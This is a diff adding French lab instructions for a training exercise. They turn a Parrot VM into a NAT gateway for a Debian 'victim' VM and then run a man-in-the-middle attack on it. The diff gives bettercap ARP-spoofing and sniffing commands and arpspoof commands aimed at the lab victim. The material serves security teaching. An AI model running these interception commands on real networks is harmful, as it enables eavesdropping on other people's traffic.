@@ -128,4 +128,51 @@ Résultat attendu :
 - 192.168.100.10 (Debian)  
 - 192.168.100.20 (Parrot)  
 
+## 🔁 Transformer Parrot en routeur NAT  
 
+### Sur Parrot (root)  
+
+Activer le routage IPv4 (temporaire) :  
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A POSTROUTING -o enp0s8 -j MASQUERADE
+
+---
+
+## 🌐 Configurer la victime pour sortir sur Internet via Parrot  
+
+### Sur Debian (root)  
+
+Définir Parrot comme passerelle par défaut :  
+ip route add default via 192.168.100.20 dev enp0s3
+
+Configurer un DNS (temporaire, pour le TP) :  
+
+ping -c 3 8.8.8.8   # doit répondre
+ping -c 3 google.com   # doit répondre si DNS OK
+
+---
+
+## 🕵️ Attaque MITM (Bettercap ou arpspoof)  
+
+### Option A — Bettercap *(recommandé)*  
+
+Sur Parrot :  
+bettercap -iface enp0s3
+
+Dans la console bettercap :  
+net.recon on
+net.show
+
+set arp.spoof.targets 192.168.100.10
+arp.spoof on
+
+set net.sniff.output /root/capture.pcap
+net.sniff on
+
+arpspoof -i enp0s3 -t 192.168.100.10 192.168.100.1
+arpspoof -i enp0s3 -t 192.168.100.1 192.168.100.10
+
+ℹ️ Ici `192.168.100.1` représente la “passerelle” vue par la victime.  
+👉 Dans notre montage, où Parrot **est déjà la passerelle**, il est plus simple et plus sûr d’utiliser **Bettercap**.  
